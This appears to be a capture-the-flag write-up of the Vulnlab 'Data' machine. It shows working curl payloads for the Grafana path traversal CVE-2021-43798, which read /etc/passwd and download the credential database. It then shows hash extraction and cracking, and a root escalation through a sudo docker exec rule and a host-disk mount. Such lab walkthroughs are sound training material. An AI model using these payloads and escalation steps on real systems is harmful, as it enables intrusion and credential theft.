---
title: "Data - Vulnlab Writeup"
date: 2026-04-09 00:00:00 +0000
categories: [boxes]
tags: [vulnlab, linux, easy, lfi, cve-2021-43798, docker, privilege-escalation, grafana]
image:
  path: /assets/img/box/13/logo.png
  alt: Data Vulnlab Machine
---

![Machine Info](https://img.shields.io/badge/Difficulty-Easy-brightgreen) ![Machine Info](https://img.shields.io/badge/OS-Linux-blue)

<p align="center"> <img src="/assets/img/box/13/logo.png" width="150"/> </p>

**Platform:** Vulnlab
**OS:** Linux
**Difficulty:** Easy
**Author:** al3xx

---

## Enumeration

### Nmap

```bash
nmap -sC -sV 10.129.234.47
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry
|_/
```

Two ports open: SSH on 22 and HTTP on 3000. Navigating to port 3000 reveals a **Grafana v8.0.0** login panel.

![Grafana Login](/assets/img/box/13/poc1.png)

---

## Foothold

### CVE-2021-43798 — Grafana Path Traversal (LFI)

Grafana versions 8.x contain an unauthenticated path traversal vulnerability in the plugin static file endpoint. By sending URL-encoded traversal sequences, an attacker can read arbitrary files from the host as the `grafana` process user — without any credentials.

**Reference:** [HackerOne Report #1427086](https://hackerone.com/reports/1427086)

**PoC — read `/etc/passwd`:**

```bash
curl http://10.129.234.47:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

```text
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
...
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

The traversal confirms unauthenticated file read. The Burp Suite request/response confirms the vulnerability:

![CVE-2021-43798 PoC in Burp Suite](/assets/img/box/13/poc2.png)

### Exfiltrating the Grafana Database

Grafana stores all configuration, users, and credentials in a SQLite database at `/var/lib/grafana/grafana.db`. This can be pulled directly via the same traversal.

```bash
curl -o grafana.db \
  'http://10.129.234.47:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db'
```

### Extracting Credentials

```bash
sqlite3 grafana.db "SELECT login, email, password, salt, is_admin FROM user;"
```

```text
admin|admin@localhost|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|1
boris|boris@data.vl|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|0
```

### Cracking the Hash

Grafana 8.x uses SHA-256 with a salt. Crack the `boris` hash offline:

```text
boris : beautiful1
```

### SSH Access

```bash
ssh boris@10.129.234.47
# Password: beautiful1

boris@data:~$ whoami
boris
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
boris@data:~$ sudo -l
```

```text
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Boris can run `docker exec` as root with no password, on any container, with any arguments. The wildcard `*` means full control over all exec parameters.

> **Note:** Boris cannot access the Docker socket directly (`docker ps` gives permission denied), but `sudo /snap/bin/docker exec` bypasses this entirely.

### Identifying the Running Container

```bash
boris@data:~$ ps aux | grep docker
# Process output reveals a container named: grafana
```

### Executing as Root Inside the Container

```bash
boris@data:~$ sudo /snap/bin/docker exec -u 0 -it grafana bash
bash-5.1# id
uid=0(root) gid=0(root) groups=0(root)
```

### Discovering Host Block Devices

```bash
bash-5.1# ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
/dev/sda  /dev/sda1  /dev/sda2
```

The host block devices are visible from inside the container — meaning the container was started without proper device isolation.

### Mounting the Host Filesystem

```bash
bash-5.1# mkdir /mnt/host
bash-5.1# mount /dev/sda1 /mnt/host
bash-5.1# ls /mnt/host/root/
root.txt  snap
```

The host root partition mounts successfully. The root flag is readable directly.

```bash
bash-5.1# cat /mnt/host/root/root.txt
<root flag>
```
